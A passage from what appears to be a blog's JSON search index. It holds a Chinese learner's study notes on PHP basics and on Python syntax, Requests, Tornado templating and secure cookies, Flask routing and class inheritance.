serialize($o);","link":"/2021/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/"},{"title":"php运算符 字符串","text":"PHP类型比较PHP变量的比较主要分为两种，就是松散比较：使用两个等号（==）比较，只比较值，不比较类型严格比较：用三个等号（===）比较，都比较 举个例子 123456789101112131415&lt;?phpif(42 == &quot;42&quot;) { echo '1、值相等';}echo PHP_EOL; // 换行符if(42 === &quot;42&quot;) { echo '2、类型相等';} else { echo '3、不相等';}?&gt;输出的结果分别是 值相等 值不相等 接下是PHP的常量设置常量需要使用define（）函数 使用方法如下 1define(&quot;常量的名称&quot;,&quot;常量的值&quot;,(可定义为true也可不写)); 12345&lt;?phpdefine(&quot;hwg&quot;,&quot;wg是帅哥&quot;);echo hwg;//输出是wg是帅哥echo HWG;//无法输出，因为大写未被定义?&gt; 说明1.第一个””是name:必选参数，常量名称，即标志符’2.第二个””是value：必选参数，常量的值。3最后一个交case_insensitive,可选参数，如果设置为TRUE，该常量则大小写不敏感，默认是大小写敏感的。 (常量名不需要加 $ 修饰符)。 举个例子 12345&lt;?phpdefine(&quot;hwg&quot;,&quot;wg是帅哥&quot;,true);echo hwg;//输出是wg是帅哥echo HWG;//输出wg是帅哥?&gt; 最后一点是，常量是全局的，定义完该常量之后只要输出该常量，出来的定义以后的值。 PHP字符串常量例 1234&lt;?php$txt=&quot;Hello world!&quot;;echo $txt;?&gt; php并置运算符123456&lt;?php$txt1=&quot;Hello world!&quot;;$txt2=&quot;What a nice day!&quot;;echo $txt1 . &quot; &quot; . $txt2;?&gt;//输出Hello world! What a nice day! PHP strlen()函数用知道字符串的长度 123&lt;?phpecho strlen(&quot;Hello world!&quot;);?&gt; PHP strpos() 函数定义和用法strpos() 函数查找字符串在另一字符串中第一次出现的位置。 注释：strpos() 函数对大小写敏感。若没有找到，则返回strpos有两种类型的返回值，一种是整型，一种是bool型。 注释：该函数是二进制安全的。例子 123&lt;?phpecho strops(&quot;you are hansom&quot;,&quot;are&quot;);?&gt; 输出结果是4（计算方法如下：从第一个y为0开始算起，空格也算一个，所以到a之前一共有4个字节） 相关函数： stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写） strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写） strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写） 参考链接https://www.w3school.com.cn/php/func_string_strpos.asp PHP运算符基本和C中的差不多，我就整理一下和C不一样的吧第一个是intdiv（）函数：该函数返回值为第一个参数除于第二个参数的值并取等（向下取等）例： 123&lt;?php var_dump(intdiv(10, 3)); ?&gt; 输出的值是int（3）有一些运算符不太一样比如不等于的表示方法有&lt;&gt;和!=绝对等于有=== 逻辑运算符：![X~KPJ$LXMK`4BK1HHQL4RP5](https://raw.githubusercontent.com/Hwwg/myphoto/master/X%7EKPJ%24LXMK%604BK1HHQL4RP5.png) 参考https://www.runoob.com/php/php-operators.html PHP三元运算符这个和if else语句有点像，我先聊聊三元运算符三元运算符的格式(expr1) ? (expr2) : (expr3)解释：如果条件”expr1”成立，则执行语句”expr2”,否则执行”expr3” 举个例子 1234&lt;?php$b = 20;echo $b=19?&quot;yes&quot;:&quot;no&quot;;?&gt; 输出结果是no转换成if语句就是 1234if（$b==20）{echo &quot;yes&quot;;}else{echo&quot;no&quot;;} 三元运算符的有点之处在于他很简练，还有更强大的应用，这里放个链接https://www.php.cn/php-weizijiaocheng-383293.html举个菜鸟教程的例子 12345678910&lt;?php$test = '菜鸟教程';// 普通写法$username = isset($test) ? $test : 'nobody';echo $username, PHP_EOL;// PHP 5.3+ 版本写法$username = $test ?: 'nobody';echo $username, PHP_EOL;//PHP_EOL的意思是一个换行符?&gt; 在这个代码里面输出的都是菜鸟教程 今天先到这里吧。哈哈哈哈哈 补充一下组合比较符组合比较运算符：可以轻松实现两个变量的比较，当啊然不仅限于数值类数据的比较符号是:&lt;=&gt;语法格式如下：$c=$a&lt;=&gt;$b;解析一下解析如下： 如果 $a &gt; $b, 则 $c 的值为 1。 如果 $a == $b, 则 $c 的值为 0。 如果 $a &lt; $b, 则 $c 的值为 -1。实例 12345678910111213141516&lt;?php// 整型echo 1 &lt;=&gt; 1; // 0echo 1 &lt;=&gt; 2; // -1echo 2 &lt;=&gt; 1; // 1// 浮点型echo 1.5 &lt;=&gt; 1.5; // 0echo 1.5 &lt;=&gt; 2.5; // -1echo 2.5 &lt;=&gt; 1.5; // 1// 字符串echo &quot;a&quot; &lt;=&gt; &quot;a&quot;; // 0echo &quot;a&quot; &lt;=&gt; &quot;b&quot;; // -1echo &quot;b&quot; &lt;=&gt; &quot;a&quot;; // 1?&gt;","link":"/2020/10/09/php%E8%BF%90%E7%AE%97%E7%AC%A6-%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"title":"postPHP efo&amp;数据类型","text":"EOF指令echo &lt;&lt;&lt;EOF//要输出的字符EFO; 需要注意的点有1.EOF其实可以用其他字母来表示2.结尾必须要有分号3 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。接下来掩饰一段 123456789&lt;?php$name=&quot;runoob&quot;;$a= *&lt;&lt;&lt;EOF &quot;abc&quot;$name &quot;123&quot;EOF*;*// 结束需要独立一行且前后不能空格*echo $a;?&gt; 输出结果是 “abc”ronoob “123” 数据类型字符串在PHP中，其实””和’’里面都是可以加要输出的文本的，和C有些不一样 整型，浮点型，布尔型，数组，对象这里要先引入一个函数var_dump($变量字符)，他是可以用来返回变量的数据类型和值（这句话没有很理解，返回值的意思是我发出一个值，通过这个函数，返回来了另一个值？但是后面又说没有返回值？？） 1234567891011&lt;?PHP$a = &quot;alsdflasdf;a&quot;;$b = var_dump($a);echo &quot;&lt;br&gt;&quot;;//var_dump($c);$d=var_dump($c);echo &quot;&lt;br&gt;&quot;;//输出一个换行符的意思echo $a;echo &quot;&lt;br&gt;&quot;;//同理echo $b;echo &quot;&lt;br&gt;&quot;; 输出的值为 12345string(12) &quot;alsdflasdf;a&quot;//这边的string（12）的意思是输出的第一个元素类型长度为12NULLalsdflasdf;a 这里分析一下这个var_dump吧，从上面这个代码分析可以看出该函数和echo的输出类型不太一样 在php下:echo 输出的是变量和字符串; var_dump 输出的是变量类型,变量长度和变量值,输出的会更详细; 接下来是整型变量 感觉和C的没多大差别，就不着重讲了，以后遇到特别的没想到的再来补充 浮点型同理整型布尔型感觉不是很懂https://www.cnblogs.com/xielong/p/9874955.html先记录网址，以后遇到具体问题的再来回顾数组数组:可以在一个变量中存储多个值 1234&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt; 可以输出 12345678array(3) { [0]=&gt; string(5) &quot;Volvo&quot; [1]=&gt; string(3) &quot;BMW&quot; [2]=&gt; string(6) &quot;Toyota&quot;} 就可以把数组内容完全输出出来，但是你用echo就只能输出array？还是挺神奇的。PHP对象首先需要用class关键字声明类对象这个格式是这样的 12345678910111213&lt;?phpclass Person//类名{ //括号里写类的定义 public $age; //属性对应的是变量 public function eat () //行为对应的是方法 { echo '我在吃饭'; }}$xiaoming = new Person();//小括号可加可不加，推荐都加var_dump($xiaoming- &gt;age = 18)；//通过对象来访问自己的属性和方法添加-&gt;(你要访问的属性和方法的字符)，前面无$，然后这个age也可以在上面写一行$xiaoming- &gt;age = 18;，然后下面写var_dump($xiaoming-&gt;age);$xiaoming-&gt;eat()；//这样就可以访问自己的方法，后面有括号 创建对象的第二个方法 $name = ‘person’; $xiaoming = new $name(); 命名规范 类名遵从大驼峰原则： persontest====&gt;PersonTest(每个单词的首字母要大写)这里才陈述一下创建对象的意义吧：创建完对象的类别，并且定义好他的属性，下次在运用时，你只要$(想要赋值的变量)=new （你定义的类）（）这样你想要赋值的变量就可以拥有类别的属性，并且可以在细操属性的值。 后续如果需要继续学习对象相关知识，再来补充接下来是PHP NULL值 就是表示一个变量为空值，可以直接设置NULL来清空一个变量的值例： 12345&lt;?php$x='hello world';$x=null;var_dump($x);?&gt; 这个比较简单就不过多陈述了 今天先到这里了，下次再来继续","link":"/2020/10/08/postPHP-efo-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"},{"title":"Python编写盲注脚本","text":"Python基本语法： 条件判断语句if True: print(&quot;True&quot;) print(&quot;ansewe&quot;)//同一个层次的代码缩进要一致，python语言用同缩进的多少表示是否为同一层次，是否为一个代码段else: print(&quot;False&quot;) score = 87if score &gt;=90 and score &lt;=100: print(&quot;A&quot;)elif score &gt;=80 and &lt;90: print(&quot;B&quot;) 引入库（随机数）import randomx = random.randint(0,2) #随机生成0 1 2print(&quot;%d&quot;%x) x=input(请输入数字)y=random.randint(0,2)if x=y: print(你们出的一样)elif x=0 and y=1 : print(&quot;我出的是剪刀，你输啦&quot;) for循环for完有一个冒号记得填写 for i in range(5)://循环从0开始一共五次 print(i) for i in range (0,10,3)//循环从0开始一直到10 每次增加3次print(i) for i in range (-10,-100,-30)//循环从-10开始一直到-100 每次减少30次print(i) 对于字符 name=&quot;chengdu&quot; for x in name: print(x)//针对字符，输出的是chengdu（有换行），不换行加一个,end='' a=[&quot;aa&quot;,&quot;bb&quot;,&quot;cc&quot;,&quot;dd&quot;]for i in range(len(a))print(i,a[i])// 这里的len指的是输出a当中元素的个数，为四个所以循环为0-4，然后打印出来 while循环i=0while i&lt;5: print(&quot;当前是第%d次执行循环&quot;%(i+1)) print(&quot;i=%d&quot;%i) i +=1 i=0a=0n=100while i&lt;=n: a=a+i i+=1print(&quot;1-%d的和=%d&quot;%(n,a)//1-100求和 count=0while cout&lt;5: print(count,&quot;小于5&quot;) count +=1else: print(count,&quot;大于或等于5&quot;)//不止是if可以加else while也可以//输出结果：0 小于51 小于52 小于53 小于54 小于55 大于或等于5 break/continue/passbreak：终止循环continue：本次循环终止pass：纯属占位 字符串word='this'sentence=&quot;this is a word&quot;paragraphy=''' this is a paragarphy 可以换行'''print(word)print(sentence)print(paragraphy)//需要转义 的字符 \\\\ \\' \\&quot; 字符串函数strstr=&quot;chengdu&quot;print(str[0:6:2])// str[起始位置:结束位置:步进值(可选，默认为1)] 字符串相连接str=&quot;chengdu&quot;print(str+&quot;,你好&quot;)//打印chengdu，你好print(str*3)//打印三次print(r&quot;hello\\nchengdu&quot;)//前面有r 里面的内容会原样输出 比如\\n就不会转义 字符串的常见操作1.bytes.decode(encoding=”utf-8”, errors=”strict”Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。2.encode(encoding=’UTF-8’,errors=’strict’以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’3.isalnum()如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True，否则返回 False4.isalpha()如果字符串至少有一个字符并且所有字符都是字母或中文字则返回 True, 否则返回 False5.isdigit()如果字符串只包含数字则返回 True 否则返回 False6.isnumeric()如果字符串中只包含数字字符，则返回 True，否则返回 False7.join(seq)以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串8.len(string)返回字符串长度9.istrip()截掉字符串左边的空格或指定字符10rstrip()删除字符串末尾的空格11split(str=””, num=string.count(str))以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串 列表定义+增加namelist=[1,'huang',3]//定义一个列表for name in namelist: print(name) //遍历输出namelist //使用while遍历输出数组length=len(namelist)i=0while i&lt;length: print(namelist[i]) i+=1//append在数字末尾增加一个值//eg1.nametemp=input(&quot;请输入数字:&quot;)namelist.append(nametemp)for num in namelist: print(num) eg2.a=[1,2]b=[3,4]a.append(b)// 将列表当做一个元素加入到a列表中//结果是 [1,2,[3,4]]extend(b)print(a)//结果是[1,2,3,4]//insert：指定下标位置插入元素a=[0,1,2]a.insert(1,3) #第一个变量表示小标，第二个变量表示元素（对象）print(a) 删除//del 在指定位置删除一个元素a=[0,1,2]del a[2]for i in a: print(i)//pop() 弹出末尾最后一个元素a.pop()//remove 直接删除指定内容的元素a.remove(1)//如果有重复的数据比如[0,1,1,2]只删除找到的第一个 更改a=[1,1,1]a[1]=2//直接改就行 查找//使用条件判断语句findnumeber=input(&quot;请输入你要查找的数字&quot;)if findnumber in a: print(&quot;在&quot;)else: print(&quot;不在&quot;)//使用index函数a=[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;a&quot;,&quot;b&quot;]print(a.index(&quot;a&quot;,1,4))//查找a这个元素在下标1-4都出现在哪里 结果返回的是数组下标，并且范围是左闭右开的//使用count计数某个元素出现几次print(mylist.count(&quot;c&quot;)) 拓展://排序和反转a=[1,4,3,2,5]a.reverse() //将列表所有元素反转a.sort() //升序排序a.sort(reverse=Ture)//降序排序 //类二位数组:a=[[1,2],[3,4],[5,6]]print(a[0])//输出[1,2]print(a[0][0])//输出[1] 三个办公室，八个老师，随机分配到三个办公室并将其打印 import randomoffices=[[],[],[]]names=[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;]for name in names: index = random.randint(0,2) offices[index].append(name)i=1for office in offices: print(&quot;%d:%d&quot;%(i,len(office))) i+=1 for name in office: print(&quot;%s&quot;%name,end=&quot;\\t&quot;) print(&quot;\\n&quot;) print(&quot;-&quot;*20) 元组tup1=() //创建一个空的元组tup2=(50)//此时不是元组 type为inttup3=(50,)//加一个逗号才能表示他是一个元组 函数//def:定义函数 Requests库学习导入requests模块 import requests 然后，尝试获取某个页面 r = requests.get('url')//get请求r = requests.post('url'，data={'key'='value'})//post请求 其他HTTP请求类型也是如此 传递URL参数在url中传递数据： Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码： payload = {'key1':'value1','key2':'value2'}r = requests.get(&quot;http://httpbin.org/get&quot;,params=payload) 返回输出结果 print(r.url)//http://httpbin.org/get?key2=value2&amp;key1=value1 **ps:**字典里的none值得键不会被添加到URL的查询字符串中 响应内容读取服务器响应的内容：import requestsr = requests.get('URL')r.textprint(r.text) 会话对象:会话对象让你能够跨请求保持某些参数。它也会在同一个session实例发出的所有请求之间保持cookie。 跨请求保持一些cookies = requests.Session()r = s.get(&quot;http://httpbin.org/cookies&quot;)print(r.text)# '{&quot;cookies&quot;: {&quot;sessioncookie&quot;: &quot;123456789&quot;}}' 参考文章:https://2.python-requests.org/zh_CN/latest/user/quickstart.htmlhttps://2.python-requests.org/zh_CN/latest/user/advanced.html#advanced python版本更换指令py -2.7py -3 1、字符串前加 f字符串格式化（python 3.6 新增，类似于perl中的变量内插） 例： vers = ‘python 3.6’ f”该功能是{vers}新增” 返回：该功能是python 3.6新增 格式化的字符串文字前缀为”f”，类似str.format()。包含由花括号包围的替换区域。替换字段是表达式，在运行时进行评估，然后使用format()协议进行格式化。 2、字符串前加 u例：u”我是含有中文字符组成的字符串。” 作用：后面字符串以 Unicode 格式 进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。 3、字符串前加 r例：r”\\n\\t\\n” 返回：\\n\\t\\n 作用：声明后面的字符串是普通字符串，相对的，特殊字符串中含有：转义字符 \\n \\t 什么什么的。 4、字符串前加 b作用：python3.x里默认的str是unicode类, py2.x的str是 bytes类, b“我(python 3)的str是 bytes” 代表的就是bytes类 。 python2.x里, b前缀没什么具体意义， 只是为了兼容python3.x的这种","link":"/2020/12/24/postPython%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"},{"title":"python Tornado学习","text":"是什么？Tornado是使用Python编写的一个强大的、可扩展的Web服务器 运行服务：真正使得Tornado运转起来的语句。首先，我们使用Tornado的options模块来解析命令行。然后我们创建了一个Tornado的Application类的实例。传递给Application类__init__方法的最重要的参数是handlers。它告诉Tornado应该用哪个类来响应请求。马上我们讲解更多相关知识。 123http_server = tornado.httpserver.HTTPServer(app)http_server.listen(options.port)tornado.ioloop.IOLoop.instance().start() 从这里开始的代码将会被反复使用：一旦Application对象被创建，我们可以将其传递给Tornado的HTTPServer对象，然后使用我们在命令行指定的端口进行监听（通过options对象取出。）最后，在程序准备好接收HTTP请求后，我们创建一个Tornado的IOLoop的实例。 模板语法一个Tornado模板仅仅是用一些标记把Python控制序列和表达式嵌入 HTML(或者任意其他文本格式)的文件中: 123456789101112&lt;html&gt; &lt;head&gt; &lt;title&gt;{{ title }}&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;ul&gt; {% for item in items %} &lt;li&gt;{{ escape(item) }}&lt;/li&gt; {% end %} &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; 如果你把这个目标保存为”template.html”并且把它放在你Python文件的 相同目录下, 你可以使用下面的代码渲染它: 1234class MainHandler(tornado.web.RequestHandler): def get(self): items = [&quot;Item 1&quot;, &quot;Item 2&quot;, &quot;Item 3&quot;] self.render(&quot;template.html&quot;, title=&quot;My title&quot;, items=items) Tornado模板支持 控制语句(control statements) 和 表达式(expressions). 控制语句被包在 {%` 和 `%} 中间, e.g., {% if len(items) > 2 %}. 表达式被包在 {{` 和 `}} 之间, e.g., {{ items[0] }}. 控制语句或多或少都和Python语句类似. 我们支持 if, for, while, 和 try, 这些都必须使用 {% end %} 来标识结束. 我们也 支持 模板继承(template inheritance) 使用 extends 和 block 标签声明, 这些内容的详细信息都可以在 tornado.template 中看到. 表达式可以是任意的Python表达式, 包括函数调用. 模板代码会在包含以下对象 和函数的命名空间中执行 (注意这个列表适用于使用 RequestHandler.render 和 render_string 渲染模板的情况. 如果你直接在 RequestHandler 之外使用 tornado.template 模块, 下面这些很多都不存 在). escape: tornado.escape.xhtml_escape 的别名 xhtml_escape: tornado.escape.xhtml_escape 的别名 url_escape: tornado.escape.url_escape 的别名 json_encode: tornado.escape.json_encode 的别名 squeeze: tornado.escape.squeeze 的别名 linkify: tornado.escape.linkify 的别名 datetime: Python datetime 模块 handler: 当前的 RequestHandler 对象 request: handler.request 的别名 current_user: handler.current_user 的别名 locale: handler.locale 的别名 _: handler.locale.translate 的别名 static_url: handler.static_url 的别名 xsrf_form_html: handler.xsrf_form_html 的别名 reverse_url: Application.reverse_url 的别名 所有从 ui_methods 和 ui_modules Application 设置的条目 任何传递给 render 或 render_string 的关键字参数 当你正在构建一个真正的应用, 你可能想要使用Tornado模板的所有特性, 尤其是目标继承. 阅读所有关于这些特性的介绍在 tornado.template 部分 (一些特性, 包括 UIModules 是在 tornado.web 模块中实现的) 在引擎下, Tornado模板被直接转换为Python. 包含在你模板中的表达式会 逐字的复制到一个代表你模板的Python函数中. 我们不会试图阻止模板语言 中的任何东西; 我们明确的创造一个高度灵活的模板系统, 而不是有严格限制 的模板系统. 因此, 如果你在模板表达式中随意填充(代码), 当你执行它的时 候你也会得到各种随机错误. 所有模板输出默认都会使用 tornado.escape.xhtml_escape 函数转义. 这个行为可以通过传递 autoescape=None 给 Application 或者 tornado.template.Loader 构造器来全局改变, 对于一个模板文件可以使 用 {% autoescape None %} 指令, 对于一个单一表达式可以使用 {% raw ...%} 来代替 {{ ... }}. 此外, 在每个地方一个可选的 转义函数名可以被用来代替 None. 注意, 虽然Tornado的自动转义在预防XSS漏洞上是有帮助的, 但是它并不能 胜任所有的情况. 在某一位置出现的表达式, 例如Javascript 或 CSS, 可能需 要另外的转义. 此外, 要么是必须注意总是在可能包含不可信内容的HTML中 使用双引号和 xhtml_escape , 要么必须在属性中使用单独的转义函数 (参见 e.g. http://wonko.com/post/html-escaping) 认证和安全Cookies 和 secure cookies你可以在用户浏览器中通过 set_cookie 方法设置 cookie: 1234567class MainHandler(tornado.web.RequestHandler): def get(self): if not self.get_cookie(&quot;mycookie&quot;): self.set_cookie(&quot;mycookie&quot;, &quot;myvalue&quot;) self.write(&quot;Your cookie was not set yet!&quot;) else: self.write(&quot;Your cookie was set!&quot;) 普通的cookie并不安全, 可以通过客户端修改. 如果你需要通过设置cookie, 例如来识别当前登录的用户, 就需要给你的cookie签名防止伪造. Tornado 支持通过 set_secure_cookie 和 get_secure_cookie 方法对cookie签名. 想要使用这 些方法, 你需要在你创建应用的时候, 指定一个名为 cookie_secret 的密钥. 你可以在应用的设置中以关键字参数的形式传递给应用程序: 123application = tornado.web.Application([ (r&quot;/&quot;, MainHandler),], cookie_secret=&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;) 签名后的cookie除了时间戳和一个 HMAC 签名还包含编码 后的cookie值. 如果cookie过期或者签名不匹配, get_secure_cookie 将返回 None 就像没有设置cookie一样. 上面例子的安全版本: 1234567class MainHandler(tornado.web.RequestHandler): def get(self): if not self.get_secure_cookie(&quot;mycookie&quot;): self.set_secure_cookie(&quot;mycookie&quot;, &quot;myvalue&quot;) self.write(&quot;Your cookie was not set yet!&quot;) else: self.write(&quot;Your cookie was set!&quot;) Tornado的安全cookie保证完整性但是不保证机密性. 也就是说, cookie不能被修改 但是它的内容对用户是可见的. 密钥 cookie_secret 是一个对称的key, 而且必 须保密–任何获得这个key的人都可以伪造出自己签名的cookie. 默认情况下, Tornado的安全cookie过期时间是30天. 可以给 set_secure_cookie 使用 expires_days 关键字参数 同时 get_secure_cookie 设置 max_age_days 参数也可以达到效果. 这两个值分别通过这样(设置)你就可以达 到如下的效果, 例如大多数情况下有30天有效期的cookie, 但是对某些敏感操作(例 如修改账单信息)你可以使用一个较小的 max_age_days . Tornado也支持多签名密钥, 使签名密钥轮换. 然后 cookie_secret 必须是一个 以整数key版本作为key, 以相对应的密钥作为值的字典. 当前使用的签名键 必须是 应用设置中 key_version 的集合. 不过字典中的其他key都允许做 cookie签名验证, 如果当前key版本在cookie集合中.为了实现cookie更新, 可以通过 get_secure_cookie_key_version 查询当前key版本. 用户认证当前已经通过认证的用户在每个请求处理函数中都可以通过 self.current_user 得到, 在每个模板中 可以使用 current_user 获得. 默认情况下, current_user 是 None. 为了在你的应用程序中实现用户认证, 你需要在你的请求处理函数中复写 get_current_user() 方法来判断当前用户, 比如可以基于cookie的值. 这里有一个例子, 这个例子允许用户简单的通过一个保存在cookie中的特殊昵称 登录到应用程序中: 123456789101112131415161718192021222324252627class BaseHandler(tornado.web.RequestHandler): def get_current_user(self): return self.get_secure_cookie(&quot;user&quot;)class MainHandler(BaseHandler): def get(self): if not self.current_user: self.redirect(&quot;/login&quot;) return name = tornado.escape.xhtml_escape(self.current_user) self.write(&quot;Hello, &quot; + name)class LoginHandler(BaseHandler): def get(self): self.write('&lt;html&gt;&lt;body&gt;&lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;' 'Name: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;' '&lt;input type=&quot;submit&quot; value=&quot;Sign in&quot;&gt;' '&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;') def post(self): self.set_secure_cookie(&quot;user&quot;, self.get_argument(&quot;name&quot;)) self.redirect(&quot;/&quot;)application = tornado.web.Application([ (r&quot;/&quot;, MainHandler), (r&quot;/login&quot;, LoginHandler),], cookie_secret=&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;) 你可以使用 Python 装饰器(decorator) tornado.web.authenticated 要求用户登录. 如果请求方法带有这个装饰器 并且用户没有登录, 用户将会被重定向到 login_url (另一个应用设置). 上面的例子可以被重写: 1234567891011121314class MainHandler(BaseHandler): @tornado.web.authenticated def get(self): name = tornado.escape.xhtml_escape(self.current_user) self.write(&quot;Hello, &quot; + name)settings = { &quot;cookie_secret&quot;: &quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;, &quot;login_url&quot;: &quot;/login&quot;,}application = tornado.web.Application([ (r&quot;/&quot;, MainHandler), (r&quot;/login&quot;, LoginHandler),], **settings) 如果你使用 authenticated 装饰 post() 方法并且用户没有登录, 服务将返回一个 403 响应. @authenticated 装饰器是 if not self.current_user: self.redirect() 的简写. 可能不适合 非基于浏览器的登录方案. 通过 Tornado Blog example application 可以看到一个使用用户验证(并且在MySQL数据库中存储用户数据)的完整例子. 代码模板123456789101112131415import tornadoimport tornado.ioloopsettings={&quot;cookie_secret&quot;:&quot;内容&quot;}class indexhandler(tornado.web.RequestHandler): def get(self): self.set_secure_cookie(&quot;username&quot;,&quot;cookie值的内容&quot;) self.write(self.set_secure_cookie(&quot;username&quot;))if __name__ == &quot;__main__&quot;: app=tornado.web.Application( [ (r&quot;/&quot;,indexhandler), ],**settings#cooki_secret:xxxx的简写 ) app.listen(8004)#端口注意别冲突 tornado.ioloop.IOLoop.current().start()","link":"/2021/03/03/python-Tornado%E5%AD%A6%E4%B9%A0/"},{"title":"python代码审计基础语法","text":"前言最近做到一题python代码审计的题目，但是总觉得有点力不从心，大概是掌握的还不够扎实,故决定整理一下遇到的一语法知识 语法基础路由所谓路由，**就是处理请求URL和函数之间关系的程序**Flask中也是对URL规则进行统一管理的，创建URL规则有两种方式： 1.使用@app.route修饰器，并传入URL规则作为参数，将函数绑定到URL，这个过程便将一个函数注册为路由，这个函数则被称为视图函数。 2.使用app.add_url_rule()。 1234567891011121314151617181920@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; #这里进行和秘钥的拼接后md5的加密传回值 return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) #这里是从cookie传回sign sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr #有个waf if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/') 这段代码意味着这个网址有三个页面一个是/geneSign 一个是/De1ta 另一个就是/根目录，每一个路由都是一个新的起点","link":"/2021/04/09/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"title":"python类的继承","text":"概述 面向对象编程 (OOP) 语言的一个主要功能就是“继承”。继承是指这样一种能力：它可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展。 通过继承创建的新类称为“子类”或“派生类”，被继承的类称为“基类”、“父类”或“超类”，继承的过程，就是从一般到特殊的过程。在某些 OOP 语言中，一个子类可以继承多个基类。但是一般情况下，一个子类只能有一个基类，要实现多重继承，可以通过多级继承来实现。 继承概念的实现方式主要有2类：实现继承、接口继承。 实现继承是指使用基类的属性和方法而无需额外编码的能力。 接口继承是指仅使用属性和方法的名称、但是子类必须提供实现的能力(子类重构爹类方法)。 在考虑使用继承时，有一点需要注意，那就是两个类之间的关系应该是“属于”关系。例如，Employee 是一个人，Manager 也是一个人，因此这两个类都可以继承 Person 类。但是 Leg 类却不能继承 Person 类，因为腿并不是一个人。 OO开发范式大致为：划分对象→抽象类→将类组织成为层次化结构(继承和合成) →用类与实例进行设计和实现几个阶段。 继承的定义12345678910111213141516171819202122class Person(object): # 定义一个父类 def talk(self): # 父类中的方法 print(&quot;person is talking....&quot;) class Child(Person): # 定义一个子类， 继承Person类 def walk(self): # 在子类中定义其自身的方法 print('is walking...') c = Child()c.talk() # 调用继承的Person类的方法c.walk() # 调用本身的方法#_bases_可以查看父类print(&quot;thebases are:&quot;,child._bases_) # 输出 person is talking....is walking... 实现继承后，子类将继承父类的属性，但doc属性不会被继承 经典类的写法： 父类名称.init(self,参数1，参数2，…) 当在Python中出现继承的情况时，一定要注意初始化函数_init_的行为: 如果子类没有定义自己的初始化函数，父类的初始化函数会被默认调用；但是如果要实例化子类的对象，则只能传入父类的初始化函数对应的参数，否则会出错。如果子类定义了自己的初始化函数，而在子类中没有显示调用父类的初始化函数，则父类的属性不会被初始化如果子类定义了自己的初始化函数，在子类中显示调用父类，子类和父类的属性都会被初始化 新式类的写法：super(子类，self).init(参数1，参数2，….) super主要来调用父类方法来显示调用父类，在子类中，一般会定义与父类相同的属性（数据属性，方法），从而来实现子类特有的行为。也就是说，子类会继承父类的所有的属性和方法，子类也可以覆盖父类同名的属性和方法。 12345678910111213141516171819202122232425class Person(object): def __init__(self, name, age): self.name = name self.age = age self.weight = 'weight' def talk(self): print(&quot;person is talking....&quot;) class Chinese(Person): #c bigberg 22 chinese def __init__(self, name, age, language): # 先继承，在重构 Person.__init__(self, name, age) #继承父类的构造方法，也可以写成：super(Chinese,self).__init__(name,age) self.language = language # 定义类的本身属性 def walk(self): print('is walking...') class American(Person): pass c = Chinese('bigberg', 22, 'Chinese') 类构造函数基础父类构造函数过程如下： 实例化对象c —-&gt; c 调用子类__init__() —- &gt; 子类__init__()继承父类__init__() —– &gt; 调用父类 __init__() 参考：https://blog.csdn.net/brucewong0516/article/details/79121179https://www.liaoxuefeng.com/wiki/1016959663602400/1017594591051072https://www.cnblogs.com/bigberg/p/7182741.html","link":"/2021/02/27/python%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF/"},{"title":"python类相关基础知识学习","text":"python——类面向对象编程需要使用类，类和实例息息相关，有了类之后我们必须创建一个实例，这样才能调用类的方法： 12class&lt;类名&gt;: &lt;语句&gt; 类私有属性：_private_attrs两个下划线开头，声明该属性为私有，不能再类的外部被使用或直接访问，在类的内部的方法中使用self._private_attrs 类的方法:在类的内部，使用def关键字可以为类定义个一个方法，与一般函数定义不同，类方法必须包含参数self，且为第一个参数 类的专有方法1234567891011121314__init__ 构造函数，在生成对象时调用__del__ 析构函数，释放对象时使用__repr__ 打印，转换__setitem__ 